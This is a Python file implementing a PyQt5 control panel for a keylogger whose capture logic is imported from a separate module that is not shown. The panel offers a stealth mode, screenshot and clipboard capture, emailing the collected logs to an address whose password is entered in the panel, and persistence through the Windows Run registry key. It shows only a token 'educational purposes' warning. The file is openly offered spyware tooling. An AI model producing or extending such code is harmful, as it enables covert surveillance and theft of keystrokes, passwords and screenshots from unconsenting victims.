import sys
import os
from PyQt5.QtWidgets import (QApplication, QMainWindow, QPushButton, 
                           QVBoxLayout, QWidget, QLabel, QCheckBox, 
                           QLineEdit, QMessageBox, QSpinBox, QGroupBox,
                           QHBoxLayout)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from keylogger import SimpleKeylogger

class KeyloggerThread(QThread):
    """Thread for running the keylogger"""
    status_signal = pyqtSignal(str)
    
    def __init__(self, email=None, password=None, stealth_mode=False,
                 screenshot_interval=300, track_mouse=True, track_clipboard=True):
        super().__init__()
        self.keylogger = SimpleKeylogger(
            email=email,
            password=password,
            stealth_mode=stealth_mode
        )
        self.keylogger.screenshot_interval = screenshot_interval
        self.running = False
        
    def run(self):
        self.running = True
        self.status_signal.emit("Keylogger started")
        self.keylogger.start()
        
    def stop(self):
        self.running = False
        self.keylogger.stop()
        self.status_signal.emit("Keylogger stopped")

class KeyloggerGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.keylogger_thread = None
        
    def initUI(self):
        self.setWindowTitle('Simple Keylogger')
        self.setGeometry(100, 100, 500, 600)
        
        # Create central widget and layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)
        
        # Status label
        self.status_label = QLabel('Status: Not Running')
        layout.addWidget(self.status_label)
        
        # Start/Stop button
        self.toggle_button = QPushButton('Start Keylogger')
        self.toggle_button.clicked.connect(self.toggle_keylogger)
        layout.addWidget(self.toggle_button)
        
        # Auto-start checkbox
        self.autostart_checkbox = QCheckBox('Enable Auto-start on Boot')
        self.autostart_checkbox.stateChanged.connect(self.toggle_autostart)
        layout.addWidget(self.autostart_checkbox)
        
        # Email settings group
        email_group = QGroupBox("Email Settings")
        email_layout = QVBoxLayout()
        
        self.email_input = QLineEdit()
        self.email_input.setPlaceholderText('Email address for logs')
        email_layout.addWidget(self.email_input)
        
        self.password_input = QLineEdit()
        self.password_input.setPlaceholderText('Email password')
        self.password_input.setEchoMode(QLineEdit.Password)
        email_layout.addWidget(self.password_input)
        
        self.email_checkbox = QCheckBox('Enable Email Logging')
        email_layout.addWidget(self.email_checkbox)
        
        email_group.setLayout(email_layout)
        layout.addWidget(email_group)
        
        # Monitoring settings group
        monitor_group = QGroupBox("Monitoring Settings")
        monitor_layout = QVBoxLayout()
        
        # Screenshot settings
        screenshot_layout = QHBoxLayout()
        screenshot_layout.addWidget(QLabel('Screenshot Interval (seconds):'))
        self.screenshot_interval = QSpinBox()
        self.screenshot_interval.setRange(60, 3600)
        self.screenshot_interval.setValue(300)
        screenshot_layout.addWidget(self.screenshot_interval)
        monitor_layout.addLayout(screenshot_layout)
        
        # Clipboard tracking
        self.clipboard_checkbox = QCheckBox('Track Clipboard Changes')
        self.clipboard_checkbox.setChecked(True)
        monitor_layout.addWidget(self.clipboard_checkbox)
        
        monitor_group.setLayout(monitor_layout)
        layout.addWidget(monitor_group)
        
        # Stealth mode checkbox
        self.stealth_checkbox = QCheckBox('Enable Stealth Mode')
        layout.addWidget(self.stealth_checkbox)
        
        # Show ethical warning
        self.show_ethical_warning()
        
    def show_ethical_warning(self):
        msg = QMessageBox()
        msg.setIcon(QMessageBox.Warning)
        msg.setWindowTitle("Ethical Warning")
        msg.setText("""
        ⚠️ ETHICAL WARNING ⚠️
        
        This keylogger is for educational purposes only.
        Always obtain proper consent before monitoring keyboard activity.
        Unauthorized use may be illegal and unethical.
        """)
        msg.setStandardButtons(QMessageBox.Ok | QMessageBox.Cancel)
        if msg.exec_() == QMessageBox.Cancel:
            sys.exit()
            
    def toggle_keylogger(self):
        if self.keylogger_thread is None or not self.keylogger_thread.running:
            self.start_keylogger()
        else:
            self.stop_keylogger()
            
    def start_keylogger(self):
        email = self.email_input.text() if self.email_checkbox.isChecked() else None
        password = self.password_input.text() if self.email_checkbox.isChecked() else None
        
        self.keylogger_thread = KeyloggerThread(
            email=email,
            password=password,
            stealth_mode=self.stealth_checkbox.isChecked(),
            screenshot_interval=self.screenshot_interval.value(),
            track_clipboard=self.clipboard_checkbox.isChecked()
        )
        self.keylogger_thread.status_signal.connect(self.update_status)
        self.keylogger_thread.start()
        self.toggle_button.setText('Stop Keylogger')
        self.status_label.setText('Status: Running')
        
    def stop_keylogger(self):
        if self.keylogger_thread:
            self.keylogger_thread.stop()
            self.toggle_button.setText('Start Keylogger')
            self.status_label.setText('Status: Stopped')
            
    def update_status(self, message):
        self.status_label.setText(f'Status: {message}')
        
    def toggle_autostart(self, state):
        if state == Qt.Checked:
            self.setup_autostart()
        else:
            self.remove_autostart()
            
    def setup_autostart(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SimpleKeylogger", 0, winreg.REG_SZ, 
                            sys.executable)
            winreg.CloseKey(key)
            QMessageBox.information(self, "Success", "Auto-start enabled")
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to enable auto-start: {e}")
            
    def remove_autostart(self):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Run",
                               0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "SimpleKeylogger")
            winreg.CloseKey(key)
            QMessageBox.information(self, "Success", "Auto-start disabled")
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to disable auto-start: {e}")
            
    def closeEvent(self, event):
        self.stop_keylogger()
        event.accept()

if __name__ == '__main__':
    app = QApplication(sys.argv)
    gui = KeyloggerGUI()
    gui.show()
    sys.exit(app.exec_()) 